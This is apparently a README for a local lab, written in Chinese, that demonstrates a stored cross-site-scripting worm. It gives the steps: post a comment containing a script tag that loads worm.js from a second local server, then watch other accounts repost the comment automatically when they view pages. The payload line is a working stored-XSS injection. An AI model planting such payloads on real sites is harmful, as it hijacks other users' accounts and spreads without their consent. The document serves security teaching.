## 操作

1. 命令行运行 `node index`
2. 打开链接  http://localhost:3000/login.html
3. 使用 badboy 账号登录，在 http://localhost:3000/comment-list.html 评论列表页面发表一条有问题的评论，评论内容如下
    ```
    Badboy is gool!<script src="http://localhost:3001/js/worm.js"></script>
    ```

4. 刷新页面，会发现每次打开这个页面都会发一条评论

5. 到 http://localhost:3000/user.html?username=badboy 退出登录，换成 kevin 账号，打开 http://localhost:3000/comment-list.html ，相当于浏览大家的评论列表，发现会自动以 kevin 的身份发了一条有问题的评论

6. 换成 cover 账号，去看 kevin 的首页，http://localhost:3000/user.html?username=kevin ，回到自己的首页，http://localhost:3000/user.html?username=cover ，发现 cover 自己也发了有问题的评论
